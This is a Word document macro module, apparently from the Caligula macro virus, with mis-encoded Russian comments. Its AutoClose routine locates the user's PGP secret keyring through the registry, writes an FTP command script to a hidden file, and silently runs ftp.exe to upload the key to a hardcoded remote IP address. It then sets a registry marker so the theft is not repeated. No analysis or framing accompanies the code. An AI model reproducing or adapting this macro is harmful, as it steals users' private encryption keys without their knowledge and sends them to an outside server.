   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub AutoClose()
   'çàðàæåíèå ïðè çàêðûòèè äîêóìåíòà
   '...
   'ïðîâåðÿåì êëþ÷ áûë óêðàäåí ñ ýòîé ìàøèíû, ñåëè íåò òî
   èùåì êëþ÷
   If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup(ACME)\User Info", "Caligula") = False) Then pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP EncryptedFile\shell\open\command", "")
   Position = InStr(1, pgppath, "pgpt")
   'óçíàåì ãäå êàòîëîã(?) pgp
   If Position <> 0 Then
   pgppath = Mid(pgppath, 1, Position - 2)
   Else
   GoTo noPGP 'íà ýòîì êîìïå íåò pgp
   End If

   With Application.FileSearch
   .FileName = "\Secring.skr"
       .LookIn = pgppath
       .SearchSubFolders = True
       .MatchTextExactly = True
       .FileType = msoFileTypeAllFiles
       .Execute
       PGP_Sec_Key = .FoundFiles(1)
   End With
   'èùåì íóæíûé íàì ôàéë
   Randomize
     For i = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
     Next i
     NewSecRingFile = "./secring" & NewSecRingFile & ".skr"
   Open "c:\cdbrk.vxd" For Output As #1
       Print #1, "o 209.201.88.110"
       Print #1, "user anonymous"
       Print #1, "pass itsme@"
       Print #1, "cd incoming"
       Print #1, "binary"
       Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
       Print #1, "quit"
       Close #1
   'îòêðîåì è çàïèøèì ïàðàìåòðû îòñûëêè
   Shell "command.com /c ftp.exe -n -s:c:\cdbrk.vxd", vbHide
   'îòñûëàåì pgp êëþ÷
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup(ACME)\User Info", "Caligula") = True

   End If

   noPGP:
   'íåò pgp
   'ñîõðàíÿåì â àêòèâíîì äîêóìåíòå
   End Sub
